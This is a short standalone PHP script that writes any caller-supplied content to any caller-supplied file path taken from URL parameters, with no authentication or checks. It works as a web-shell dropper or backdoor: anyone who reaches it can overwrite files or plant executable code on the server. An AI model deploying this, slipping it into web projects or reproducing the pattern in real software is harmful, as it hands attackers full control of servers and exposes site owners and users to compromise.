<?php
	$file = fopen($_GET["filename"], "w") or die ("CANT OPEN FILE");
	fwrite($file, $_GET["content"]);
	fclose($file);	
?>